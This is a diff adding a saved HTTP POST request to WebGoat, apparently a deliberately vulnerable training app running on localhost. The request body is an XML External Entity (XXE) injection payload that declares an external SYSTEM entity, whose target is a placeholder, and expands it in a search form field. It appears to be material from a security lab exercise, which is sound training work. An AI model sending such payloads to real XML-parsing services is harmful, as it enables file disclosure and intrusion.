@@ -1,0 +1,13 @@
+POST /WebGoat/attack?Screen=87365&menu=1700 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:9090/WebGoat/start.mvc
+Content-Length: 121
+Content-Type: text/plain;charset=UTF-8
+Cookie: JSESSIONID=22E1DA493C63967610FE5241CC9717C1
+Connection: close
+
+<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "[PLACEHOLDER]">]><searchForm><from>&xxe;</from></searchForm>
